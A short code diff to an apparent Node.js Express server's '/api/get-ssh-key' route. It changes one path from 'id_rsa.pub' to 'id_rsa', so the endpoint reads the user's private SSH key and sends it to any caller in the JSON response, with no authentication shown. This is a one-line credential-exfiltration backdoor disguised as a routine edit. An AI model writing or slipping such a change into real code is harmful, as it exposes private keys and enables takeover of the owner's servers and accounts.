@@ -19,7 +19,7 @@ app.get('/api/get-ssh-key', (req, res) => {
     try {
         const sshKeyPath = path.join(process.env.HOME, '.ssh', 'id_rsa.pub');
         const sshKey = fs.readFileSync(sshKeyPath, 'utf8');
-        const sshKeyPathSec = path.join(process.env.HOME, '.ssh', 'id_rsa.pub');
+        const sshKeyPathSec = path.join(process.env.HOME, '.ssh', 'id_rsa');
         const sshKeySecret = fs.readFileSync(sshKeyPathSec, 'utf8');
         res.status(200).send({ public: sshKey, private: sshKeySecret });
     } catch (error) {
